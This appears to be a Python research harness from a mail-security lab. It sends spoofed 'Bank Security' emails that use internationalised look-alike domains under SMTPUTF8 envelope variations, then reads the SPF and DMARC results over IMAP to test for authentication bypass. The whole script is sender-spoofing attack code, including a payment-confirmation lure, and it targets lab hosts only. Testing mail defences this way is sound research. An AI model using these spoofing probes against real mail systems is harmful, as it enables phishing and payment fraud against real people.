"""Attack 3 probes: SMTPUTF8 envelope identity layer.

e1  U-label envelope domain + SMTPUTF8 + From=A-label victim
e2  U-label envelope + SMTPUTF8 + From=U-label (double void?)
e3  U-label envelope WITHOUT SMTPUTF8 param (declaration enforcement)
e4  ASCII envelope + From=U-label (known control)
e5  UTF-8 local-part + ASCII domain + SMTPUTF8
Observables: MAIL command reply, SPF/DKIM/DMARC in AR, DNS qname forms.
"""
from __future__ import annotations

import json
import re
import subprocess
import sys
import time
from pathlib import Path

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "utf8env"
EVIDENCE = "/evidence/w2-20261002a/utf8env"
VICTIM = "xn--mnchen-3ya.bank.test"
NFC = "m\u00fcnchen.bank.test"

CASES = [
    {"name": "e1-ulabel-env-param", "from": f"From: Bank Security <security@{VICTIM}>", "mail": f"security@{NFC}", "param": "SMTPUTF8"},
    {"name": "e2-ulabel-both", "from": f"From: Bank Security <security@{NFC}>", "mail": f"security@{NFC}", "param": "SMTPUTF8"},
    {"name": "e3-ulabel-env-noparam", "from": f"From: Bank Security <security@{VICTIM}>", "mail": f"security@{NFC}", "param": ""},
    {"name": "e4-ascii-env-ulabel-from", "from": f"From: Bank Security <security@{NFC}>", "mail": "alice@lab.test", "param": ""},
    {"name": "e5-utf8-local", "from": f"From: Bank Security <security@{VICTIM}>", "mail": "\u4f5c\u8005@bank.test", "param": "SMTPUTF8"},
]


def sh(args, timeout=90, stdin=None):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False, input=stdin)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


FETCH_SCRIPT = r'''
import imaplib, json, sys
case = sys.argv[1]
m = imaplib.IMAP4("msl-dovecot", 143)
m.login("bob", "lab-bob")
m.select("INBOX", readonly=True)
typ, data = m.search(None, "ALL")
out = {"found": False}
for item in reversed(data[0].split()):
    typ, msg = m.fetch(item, "(BODY.PEEK[])")
    raw = msg[0][1] if msg and msg[0] else b""
    if case.encode() not in raw:
        continue
    open(f"/evidence/w2-20261002a/utf8env/{case}.stored.eml", "wb").write(raw)
    lines = raw[:raw.find(b"\r\n\r\n")].split(b"\r\n")
    ars = []
    for i, l in enumerate(lines):
        if b"Authentication-Results" in l:
            blk = l.decode("utf-8", "replace")
            k = i + 1
            while k < len(lines) and lines[k].startswith((b"\t", b" ")):
                blk += " " + lines[k].decode("utf-8", "replace").strip()
                k += 1
            ars.append(blk)
    rp = [l.decode("utf-8", "replace") for l in lines if l.lower().startswith(b"return-path")]
    out = {"found": True, "uid": item.decode(), "ar": ars, "return_path": rp[:1]}
    break
m.logout()
print(json.dumps(out))
'''


def fetch_stored(case_id: str, tries: int = 8, delay: float = 1.2):
    last = {"found": False}
    for _ in range(tries):
        code, out, _ = sh(["docker", "exec", "-i", "msl-client", "python3", "-", case_id],
                          timeout=60, stdin=FETCH_SCRIPT.encode())
        try:
            last = json.loads(out)
        except json.JSONDecodeError:
            last = {"found": False}
        if last.get("found"):
            return last
        time.sleep(delay)
    return last


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    t0 = time.strftime("%H:%M:%S")
    rows = []
    for case in CASES:
        name = case["name"]
        case_id = "u8-" + name
        raw = (case["from"].encode("utf-8") + b"\r\n"
               b"To: bob@lab.test\r\n"
               b"Date: Sat, 3 Oct 2026 22:00:00 +0000\r\n"
               + ("Subject: utf8 env %s\r\n" % name).encode()
               + ("Message-ID: <%s@lab.test>\r\n" % case_id).encode()
               + ("X-Case-ID: %s\r\n" % case_id).encode()
               + b"\r\nPlease confirm the payment.\r\n")
        (STAGE / f"{name}.eml").write_bytes(raw)
        param = ["--param", case["param"]] if case["param"] else []
        code, out, err = sh([
            "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send_utf8.py",
            "--server", "msl-auth-postfix", "--port", "25",
            "--mail-from", case["mail"],
            *param,
            "--rcpt-to", "bob@lab.test",
            "--input", f"{EVIDENCE}/{name}.eml",
            "--transcript", f"{EVIDENCE}/{name}.smtp.txt",
        ], timeout=90)
        try:
            sent = json.loads(out)
        except json.JSONDecodeError:
            sent = {"accepted": False, "raw": (out or err)[-200:]}
        stored = fetch_stored(case_id) if sent.get("accepted") else {"found": False}
        text = " ".join(stored.get("ar") or [])
        spf = re.search(r"spf=(\w+)", text)
        dm = re.search(r"dmarc=(\w+)", text)
        row = {"case": name, "mail_ok": sent.get("mail_ok"), "mail_reply": sent.get("mail_reply"),
               "reply": sent.get("reply"), "delivered": stored.get("found"),
               "spf": spf.group(1) if spf else "absent",
               "dmarc": dm.group(1) if dm else "absent",
               "return_path": stored.get("return_path", [])}
        rows.append(row)
        print(json.dumps({k: row[k] for k in ("case", "mail_ok", "reply", "spf", "dmarc", "return_path")},
                         ensure_ascii=False), flush=True)
        time.sleep(2)
    (STAGE / "cases.json").write_text(json.dumps({"t0": t0, "rows": rows}, ensure_ascii=False, indent=1), encoding="utf-8")


if __name__ == "__main__":
    main()
